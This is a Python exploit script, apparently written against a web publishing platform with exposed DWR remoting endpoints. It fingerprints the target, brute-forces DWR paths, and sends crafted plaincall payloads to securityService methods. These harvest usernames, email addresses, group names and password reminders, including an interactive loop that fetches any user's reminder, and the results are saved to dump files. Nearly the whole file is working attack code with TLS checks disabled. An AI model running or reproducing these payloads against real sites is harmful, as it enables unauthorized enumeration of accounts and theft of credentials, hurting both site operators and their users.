import requests
import sys
import re
# Disable cert verification
requests.urllib3.disable_warnings()

""" ADD this to requests.get() if you would like to use a proxy """
PROXY = "http://127.0.0.1:8080"


class Coffe():

    def __init__(self, url):
        self.url = url



    def is_alive(self):
        try:
            req = requests.get(self.url, verify=False, timeout=5, headers={"User-Agent":"Firefoxt0x1n4K ~"})
            if req.status_code != 200:
                print(f"[ERROR] ~> Something went wrong while request to {self.url}")
                return True
            return False
        except (requests.exceptions.Timeout,requests.exceptions.BaseHTTPError) as e:
            print(f"Error: {e}")



    def get_info_robots(self):
        url = self.url + "/robots.txt"
        try:
            req = requests.get(url, timeout=6, verify=False, headers={"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}) 
            if req.status_code == 200:
                print(f"[INFO] Robots.txt found")            
            if "publish" in req.text:
                print(f"[INFO] this instances is confirmed as mmpublish")
        except (requests.exceptions.Timeout,requests.exceptions.BaseHTTPError) as e:
           print(f"Error: {e}")



    def find_dwr(self):
        try:
            url = self.url + "/dwr"
            req = requests.get(url, verify=False, timeout=6, headers={"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"})
            if req.status_code == 200:
                print(f"[High] - Target Target Has DWR open at {url}.")
        except (requests.exceptions.Timeout,requests.exceptions.BaseHTTPError) as e:
            print(f"Error: {e}")




    def find_dwr_view(self):
        try:
            url = self.url + "/dwr-view/"
            req = requests.get(url, verify=False, timeout=6, headers={"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"})
            if req.status_code == 200:
                print(f"[Critical] - Target is vulnerable. copy the URL {url}.")
        except (requests.exceptions.Timeout,requests.exceptions.BaseHTTPError) as e:
            print(f"Error: {e}")



    def find_admin_path(self):
        
        url = self.url + "/admin/admin.login.action"
        
        try:
            req = requests.get(url, verify=False, headers={"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"})
            if req.status_code == 200:
                print(f"[FOUND] Admin path at: {url}")
        except (requests.exceptions.Timeout,requests.exceptions.BaseHTTPError) as e:
            print(f"Error: {e}")



    def brute_dwr_path(self):
        try:
            fh = open('databases/paths.txt', 'r')
            for line in fh.readlines():
                url = self.url + line.rstrip()
                try:
                    req = requests.get(url, verify=False, timeout=6, headers={"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"})
                    if req.status_code == 200:
                        print(f"[MEDIUM] found a dwr path: [{url}]")
                except (requests.exceptions.Timeout,requests.exceptions.BaseHTTPError) as e:
                    print(f"error at {url}: {e}")
        except (FileNotFoundError,) as e:
            print(f"[INFO] file not found {e}")
        

    def get_users_login(self):
        
        exploit = "callCount=1\npage=/dwr-view/test/userService\nhttpSessionId=\nscriptSessionId=15467B75AB0FF3158D39ADF6D866C078381\nc0-scriptName=securityService\nc0-methodName=getUsers\nc0-id=0\nc0-param0=number:0\nc0-param1=boolean:false\nbatchId=2"
        
        r = requests.post(self.url + "/dwr/call/plaincall/securityService.getUsers.dwr", headers={"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Content-Type": "application/x-www-form-urlencoded"}, data=exploit, verify=False)
    
        if "200" in str(r) and not "404" in r.text:
            print("[INFO] Getting Possible logins... \n")
            
            f = open('databases/users-file.txt', 'w')
            for m in re.findall(r'name="(\w*)"', r.text):
                print("[+] Possible user: {}".format(str(m)))
                f.write(m+"\n")
            f.close() 
        print("[INFO] Finish all possible logins were got.. \n")
        print("[INFO] created a file.. ( user-file.txt ) with all users collected \n")
           


    def exploit_user_email(self):
        
        exploit = "callCount=1\npage=/dwr-view/test/userService\nhttpSessionId=\nscriptSessionId=15467B75AB0FF3158D39ADF6D866C078381\nc0-scriptName=securityService\nc0-methodName=getUsers\nc0-id=0\nc0-param0=\nnumber=0\nc0-param1=boolean:false\nbatchId=2"

        r = requests.post(self.url + "/dwr/call/plaincall/securityService.getUsers.dwr", data=exploit, headers={"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}, verify=False)

        f = open('dump/mails-file.txt', 'w')

        if "200" in str(r) and not "404" in r.text:

            print((f"[INFO] Getting Emails... \n"))
            
            for m in re.findall(r'email="([\w\.-]+@[\w\.-]+)"', r.text):
                print("[INFO] Possible email: {}".format(str(m)))
                f.write(m+"\n")

        print("[INFO] created a file.. ( mails-file.txt ) with all emails collected \n")
        f.close()



    def all_users_remainders(self):
        alist = [line.rstrip() for line in  open('dump/mails-file.txt')]
        passwords_file = "passwords-remainder-users.txt" 
        f = open(passwords_file, 'w')
    
        for usr in alist:
            
            exploit = 'callCount=1\n"page=/dwr-view/test/securityService\nhttpSessionId=CDB3084D13EEC28BED7EAC3CE49F902C\nscriptSessionId=5EE540BF8C30DE30ACD6E0045EC3D44C464\nc0-scriptName=securityService\nc0-methodName=getPasswordReminder\nc0-id=1\nc0-param0=string:'+usr+"\nbatchId=2"

            r = requests.post(self.url + "/dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", data=exploit, verify=False)
            
            if r.status_code == 200:
                for m in re.findall(r'_remoteHandleCallback((.*))', r.text):
                    print("[+] user {} : {}".format(usr, str(m)))
                    f.write(str(m))
        f.close()      


    def get_user_remind(self):
        
        exploit = 'callCount=1\npage=/dwr-view/test/securityService\nhttpSessionId=CDB3084D13EEC28BED7EAC3CE49F902C\nscriptSessionId=5EE540BF8C30DE30ACD6E0045EC3D44C464\nc0-scriptName=securityService\nc0-methodName=getPasswordReminder\nc0-id=0\nc0-param0=string:admin\nbatchId=2'
        
        
        r = requests.post(self.url + "/dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", data=exploit, verify=False)


        if r.status_code == 200 and not r.status_code == 404:
            while True:
                remainderUser = input("[+] Type the user to get ther password Remainder or (type [q] to quit):  ").lower()
                if remainderUser[0].lower() == 'q':
                    break
                else:
                    xpltUser = {"callCount":1,"page":"/dwr-view/test/securityService","httpSessionId":"CDB3084D13EEC28BED7EAC3CE49F902C","scriptSessionId":"5EE540BF8C30DE30ACD6E0045EC3D44C464",
                    "c0-scriptName":"securityService","c0-methodName":"getPasswordReminder","c0-id":"0","c0-param0":"string:"+remainderUser,"batchId":'2'}
                    
                    
                    r2 = requests.post(self.url + "/dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", headers={"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}, data=xpltUser, verify=False)
                    print(r2.text)


    def get_groups(self):
        url = self.url + "/dwr/call/plaincall/securityService.getGroups.dwr"
        
        headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Connection": "close"}

        data = """callCount=1
page=/admin/corpo/admin.action
httpSessionId=
scriptSessionId=3D297808D40E18383E1B3BD81548A876812
c0-scriptName=securityService
c0-methodName=getGroups
c0-id=0
c0-param0=string:0
c0-param1=boolean:false
batchId=25"""
        
        try:
            r = requests.post(url, headers=headers, data=data, timeout=10, verify=False)
            if r.status_code == 200 and not r.status_code == 404:
                print(f"[INFO] Found groups\n")
                for m in re.findall(r'name=(\".*\");', r.text):
                    print(f"[INFO] groups found: {str(m)}")
        except (requests.exceptions.HTTPError,requests.exceptions.Timeout) as e:
            print(f"get_groups error {e}")
        